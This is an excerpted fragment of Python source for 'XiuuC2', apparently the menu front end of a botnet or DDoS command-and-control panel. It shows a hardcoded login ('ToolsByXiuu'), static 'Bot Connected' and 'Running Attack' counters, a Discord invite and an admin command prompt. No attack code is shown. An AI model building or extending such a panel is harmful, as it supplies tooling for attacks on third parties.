...
sys.stdout.write("\x1b]2;[-] XiuuC2 | Online User : [{}] | Running Attack [5] | Bot Connected [89] | Admin : [Xiuu] | Username : Xiuu\x07".format (prot))
...
if password == "ToolsByXiuu" and username == "ToolsByXiuu":
    print ("Logged In As ToolsByXiuu")
    time.sleep(2)
...
ticket = """
\033[96m For Ticket You Can Join Our Discord Server. https://discord.gg/jCKVZCdX
"""
...
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
"""
attacked =  """\033[97m[INFO] Attack Was Success By Xiuu!!!"""
...
def main():
    ...
    while True:
        ...
        sys.stdout.write("\x1b]2;[-]XiuuC2 | Online User : [{}] | Running Attack [6] | Bot Connected [89] | Admin : [Xiuu] | Backup Server : [2] | Username : Xiuu\x07".format (powerran))
        sin = input("\033[95m[\033[97madmin@Xiuu\033[95m]\033[37m >> \033[92m".format(nicknm)).lower()
        sinput = sin.split(" ")[0]
